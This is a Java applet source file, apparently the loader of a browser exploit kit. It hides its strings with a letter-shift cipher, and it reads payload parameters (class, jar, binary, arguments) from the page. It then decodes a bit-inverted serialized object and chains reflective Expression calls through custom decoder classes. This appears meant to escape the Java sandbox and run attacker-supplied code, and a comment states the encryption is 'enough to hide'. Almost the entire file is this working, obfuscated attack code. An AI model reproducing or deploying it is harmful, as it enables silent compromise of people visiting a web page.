package x;

import java.beans.Expression;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.io.ObjectInputStream;
import java.net.URL;
import java.util.ArrayList;

import javax.swing.JApplet;
import javax.swing.JList;
import javax.swing.SwingUtilities;

@SuppressWarnings("all")
public class XAppletW extends JApplet {

    private static final long serialVersionUID = 4268202609884012044L;
    public static URL urlBase;

    @Override
    public void init() {
    	
    	urlBase = getCodeBase();
    	
    	// Parsing arguments.
    	EP.pClass = getParameter(x.Strings.dec("qDmbtt"));  
    	EP.pJar = getParameter(x.Strings.dec("qKbs"));
    	EP.pBin = getParameter(x.Strings.dec("qCjo"));
    	int argCount = 1;
    	String arg;
    	ArrayList<String> args = new ArrayList<String>();
    	while( (arg=getParameter(x.Strings.dec("qBsh")+argCount++)) != null ) {
    		args.add(arg);
    	}
    	EP.pArgs = new String[args.size()];  
    	args.toArray(EP.pArgs);
    	EP.docBase = this.getDocumentBase().toString();
//    	System.out.println(x.Strings.dec("Ifmmp!")+ExploitParams.docBase);
    	
    	//Execute a job on the event-dispatching thread; creating this applet's GUI.
        try {
            SwingUtilities.invokeAndWait(new Runnable() {
                public void run() {  	
            		try {
						byte[] bytes = new byte[4096];
						InputStream in = XAppletW.class.getResourceAsStream(x.Strings.dec("dmbttft/tfs"));
						ByteArrayOutputStream out = new ByteArrayOutputStream();
						int bytesRead;
						while( (bytesRead = in.read(bytes)) != -1) {
							out.write(bytes, 0, bytesRead);
						}
						in.close();
						bytes = out.toByteArray();
						for( int i=0; i<bytes.length; i++ ) {
							bytes[i] = (byte) (bytes[i] ^ 255); // x.Strings.dec("Jowfstf!cjut!fodszqujpo"): Enough to hide
						}
						ByteArrayInputStream bin = new ByteArrayInputStream(bytes);
						ObjectInputStream oin = new ObjectInputStream(bin);		
						EC cl = (EC) oin.readObject();
						//-------------------
						in = XAppletW.class.getResourceAsStream(x.Strings.dec("joqvu/ynm"));
						Object dec = new Expression(cl.getClass(x.Strings.dec("y/NzYNMEfdpefs")),x.Strings.dec("ofx"),new Object[] {in}).getValue();
						Object iter = new Expression(cl.getClass(x.Strings.dec("y/Dpoufyu`dmptf`Dbmmfs")),x.Strings.dec("dsfbuf"),new Object[] {dec}).getValue();
						Object o = new Expression(cl.getClass(x.Strings.dec("y/NzIbtiTfu")),x.Strings.dec("ofx"),new Object[] {iter}).getValue();
						JList list = new JList();
						list.setListData(new Object[] { o });
						add(list);
					} catch (Exception e) {
						//e.printStackTrace();
					}
                }
            });
        } catch (Exception e) {
            //e.printStackTrace();
        }
    }

}
